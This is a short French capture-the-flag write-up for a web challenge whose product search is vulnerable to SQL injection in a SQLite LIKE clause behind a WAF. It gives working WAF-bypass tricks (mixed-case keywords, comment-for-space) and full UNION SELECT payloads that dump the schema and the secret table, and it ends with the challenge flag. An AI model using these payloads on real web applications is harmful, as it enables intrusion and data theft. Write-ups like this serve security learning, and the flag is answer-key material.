# thierry8petstar--shadow-catalog (web, 200) — RÉSOLU

## Challenge
"Shadow Catalog v2.1 - Protégé par WAF". Page unique avec recherche `GET /?q=`.
Un article secret est caché. But : le récupérer.

## Exploit — SQLi (sqlite, LIKE) avec bypass WAF
La recherche = `... WHERE name LIKE '%{q}%'` (injection string). Preuve : `_` et `%` (wildcards
LIKE) sont interprétés (`Clav_er`, `%avier` → match).

Le **WAF** bloque : les **espaces** (« Clavier Mécanique » avec espace → Aucun) et les mots-clés
SQL en **MAJUSCULES** (`OR`, `UNION`, `SELECT`). Bypass :
- casse mixte : `oR`, `uNiOn`, `sElEcT` (ex: `%'oR'1'LIKE'1` → renvoie TOUT).
- `/**/` à la place des espaces ; commentaire final `--/**/-`.

Extraction :
1. Schéma : `zzz%'uNiOn/**/sElEcT/**/name,sql,3/**/fRoM/**/sqlite_master--/**/-`
   → révèle la table **`s3cr3t_fl4g_st0r3 ( id, secret_code TEXT, notes TEXT )`**.
2. Flag : `zzz%'uNiOn/**/sElEcT/**/secret_code,notes,3/**/fRoM/**/s3cr3t_fl4g_st0r3--/**/-`.

(3 colonnes : name, category, price.)

## Flag
`NCTF{bb3fae141ce242584de39c79}`
